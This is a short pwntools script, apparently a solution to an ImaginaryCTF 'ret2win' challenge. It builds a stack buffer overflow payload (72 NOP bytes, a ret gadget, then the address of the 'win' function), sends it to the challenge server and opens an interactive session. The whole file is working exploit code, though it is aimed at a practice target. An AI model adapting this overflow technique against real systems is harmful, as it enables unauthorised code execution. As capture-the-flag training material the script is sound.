# Classic buffer overflow exploit example


from pwn import *


elf = context.binary = ELF("./vuln", checksec=False)
conn = remote("ret2win.chal.imaginaryctf.org", 1337)

padding = 72
payload = flat(
    asm("nop") * padding,
    next(elf.search(asm('ret'))),
    elf.symbols["win"],
)

with open("payload", "wb") as file:
    file.write(payload)

conn.recvline()
conn.sendline(payload)
print(conn.recvline())
conn.interactive()
